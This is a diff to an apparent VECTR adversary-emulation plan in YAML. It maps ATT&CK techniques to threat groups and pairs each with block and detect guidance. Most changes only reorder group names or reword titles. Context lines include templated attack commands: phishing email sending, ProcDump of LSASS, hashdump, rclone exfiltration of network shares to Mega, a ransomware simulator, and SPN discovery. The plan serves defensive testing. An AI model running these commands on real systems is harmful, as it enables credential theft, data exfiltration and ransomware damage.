@@ -49,8 +49,8 @@ Initial Access:
     tid: T1566.002
     x_vectr_id: db33d2b3-9d9a-4e72-ac8f-548ecc7d4cdf
     groups:
-    - Bumblebee
     - FIN7
+    - Bumblebee
   guidance:
   - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments {{ attachment }}
   block:
@@ -69,8 +69,8 @@ Initial Access:
     tid: T1566.002
     x_vectr_id: 96efbefa-60e7-41eb-8ba3-e837e57a8036
     groups:
-    - Bumblebee
     - FIN7
+    - Bumblebee
   guidance:
   - ps> Send-MailMessage -SmtpServer {{ maildomain }} -UseSSL -BodyAsHTML -Subject {{ subject }} -Body {{ body }} -To {{ target }} -From {{ from }} -Attachments {{ attachment }}
   block:
@@ -163,8 +163,8 @@ Command and Control:
     tid: T1105
     x_vectr_id: 9755cd8b-5212-4331-8c6e-afb27404a4b9
     groups:
-    - Conti
     - FIN7
+    - Conti
   block:
   - Signatures for known bad tools are blocked by network security controls such as an ID/PS
   detect:
@@ -183,10 +183,10 @@ Command and Control:
     tid: T1219
     x_vectr_id: 10f6c44e-b862-4553-bc55-68f6d941bcfb
     groups:
+    - FIN7
     - Bumblebee
     - LAPSUS$
     - Conti
-    - FIN7
   block:
   - Block the installation and usage of unapproved third-party utilities via application control software
   - Connections to known remote access service domains/IPs are blocked
@@ -206,10 +206,10 @@ Command and Control:
     tid: T1071.001
     x_vectr_id: 38064494-0d58-4f48-bce8-b5b7ea7db3da
     groups:
-    - APT41
     - Bumblebee
-    - QakBot
+    - APT41
     - Conti
+    - QakBot
   block:
   - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
   detect:
@@ -230,10 +230,10 @@ Command and Control:
     tid: T1071.001
     x_vectr_id: 3ed2f449-744b-48c3-80d2-854386e446a0
     groups:
-    - APT41
     - Bumblebee
-    - QakBot
+    - APT41
     - Conti
+    - QakBot
   block:
   - C2 channel is blocked by proxy, firewall, or network behavioral/UEBA tool
   detect:
@@ -277,9 +277,9 @@ Execution:
     tid: T1106
     x_vectr_id: 447f4719-e006-421d-99de-55a6c603dc27
     groups:
+    - FIN7
     - Bumblebee
     - Quantum
-    - FIN7
   guidance:
   - cmd> {{ exe }}
   block:
@@ -321,8 +321,8 @@ Execution:
     tid: T1204.002
     x_vectr_id: 45f30aa4-cb46-4522-806c-6f1144a86735
     groups:
-    - QakBot
     - Conti
+    - QakBot
   platforms:
   - windows
   block:
@@ -347,8 +347,8 @@ Execution:
     tid: T1204.002
     x_vectr_id: 519c429d-d08d-4a9b-87f3-496ad304b234
     groups:
-    - QakBot
     - Conti
+    - QakBot
   platforms:
   - windows
   block:
@@ -396,8 +396,8 @@ Defense Evasion:
     tid: T1218.010
     x_vectr_id: 492043f3-1847-4492-946e-137db9e54f2d
     groups:
-    - QakBot
     - Conti
+    - QakBot
   platforms:
   - windows
   guidance:
@@ -498,8 +498,8 @@ Persistence:
     tid: T1053.005
     x_vectr_id: 20a6dace-d801-42f5-b659-6cf91e39d273
     groups:
-    - Bumblebee
     - FIN7
+    - Bumblebee
   platforms:
   - windows
   prerequisites:
@@ -569,7 +569,7 @@ Persistence:
   controls:
   - SIEM
   - Endpoint Protection
-- name: New local administrator
+- name: Persist via new local administrator
   description: Create a new local user then add them to the "Administrators" group using the builtin net.exe
   metadata:
     isv: 1
@@ -634,9 +634,9 @@ Impact:
     x_tools:
     - https://github.com/2XXE-SRA/payload_resources/tree/master/coldencryptor
     groups:
+    - FIN7
     - Bumblebee
     - Quantum
-    - FIN7
   guidance:
   - cmd> coldcryptor.exe run {{ extension }}
   block:
@@ -706,8 +706,8 @@ Credential Access:
     tid: T1003.003
     x_vectr_id: 08efdcab-54e0-4e06-8f72-b72f23e4fcab
     groups:
-    - Bumblebee
     - LAPSUS$
+    - Bumblebee
   platforms:
   - windows
   prerequisites:
@@ -735,8 +735,8 @@ Credential Access:
     tid: T1003.003
     x_vectr_id: 4bf62dcb-0a6e-4805-8536-d17122d956c5
     groups:
-    - Bumblebee
     - LAPSUS$
+    - Bumblebee
   platforms:
   - windows
   prerequisites:
@@ -817,7 +817,7 @@ Credential Access:
   - SIEM
   - Endpoint Protection
   - Application Control
-- name: Extract LSASS Process Memory via Sysinternals ProcDump
+- name: Dump LSASS memory using Sysinternals ProcDump
   description: Use ProcDump from Sysinternals to dump LSASS process memory
   metadata:
     isv: 1
@@ -837,15 +837,14 @@ Credential Access:
   - CMD> procdump -ma lsass.exe dump
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
-  - Enable additional LSA protections or Windows Credential Guard to prevent traditional process dumping of LSASS
+  - Enable Credential Guard to prevent traditional process dumping of LSASS
   detect:
-  - Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
+  - Suspicious process execution/behavior is detected by endpoint security tool or triggers alert in SIEM based on telemetry
   logs:
   - edr:telemetry
-  - process_create
   controls:
-  - Endpoint Protection
   - SIEM
+  - Endpoint Protection
 - name: Extract local user credentials using hashdump
   description: Use hashdump to extract local user credentials from the SAM
   metadata:
@@ -854,14 +853,14 @@ Credential Access:
     tid: T1003.002
     x_vectr_id: b2cced6c-b8b1-4ee8-93d9-4f5dc4b61afb
     groups:
-    - APT41
     - Bumblebee
+    - APT41
   platforms:
   - windows
   prerequisites:
   - local_admin
   guidance:
-  - beacon> hashdump
+  - implant> hashdump
   block:
   - Suspicious process execution/behavior blocked by endpoint security tool
   detect:
@@ -873,7 +872,7 @@ Credential Access:
   controls:
   - Endpoint Protection
   - SIEM
-- name: Extract Browser Credentials
+- name: Extract browser credentials
   description: Extract credentials information (saved passwords, sessions) from browser
   metadata:
     isv: 1
@@ -911,8 +910,8 @@ Exfiltration:
     x_tools:
     - https://rclone.org/
     groups:
-    - Conti
     - FIN7
+    - Conti
   guidance:
   - CMD> rclone.exe copy --max-age 2y "{{ network_share }}" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
   block:
@@ -938,9 +937,9 @@ Lateral Movement:
     tid: T1021.001
     x_vectr_id: 0735ef7e-438f-4fc9-a656-7d11d73fbc61
     groups:
+    - FIN7
     - Bumblebee
     - Conti
-    - FIN7
   platforms:
   - windows
   prerequisites:
@@ -968,8 +967,8 @@ Lateral Movement:
     tid: T1021.003
     x_vectr_id: 3c337f53-d086-4f2f-818a-08fb1a1c5f79
     groups:
-    - APT41
     - Bumblebee
+    - APT41
     - Conti
   platforms:
   - windows
@@ -1029,9 +1028,9 @@ Discovery:
     x_tools:
     - https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
     groups:
-    - APT41
     - LAPSUS$
     - Bumblebee
+    - APT41
     - Conti
   platforms:
   - windows
@@ -1056,9 +1055,9 @@ Discovery:
     tid: T1087.002
     x_vectr_id: b901e32f-67c0-4449-a120-ea820384e9e6
     groups:
-    - APT41
     - LAPSUS$
     - Bumblebee
+    - APT41
     - Conti
   platforms:
   - windows
@@ -1082,9 +1081,9 @@ Discovery:
     tid: T1087.002
     x_vectr_id: 81ed48d0-a13c-40db-9f11-6675ef57d41e
     groups:
-    - APT41
     - LAPSUS$
     - Bumblebee
+    - APT41
     - Conti
   guidance:
   - cmd> setspn -T {{ domain }} -Q */*
@@ -1175,8 +1174,8 @@ Discovery:
     tid: T1018
     x_vectr_id: bc85f11b-e481-4afb-a5f5-db26e5c07433
     groups:
-    - APT41
     - Bumblebee
+    - APT41
   platforms:
   - windows
   guidance:
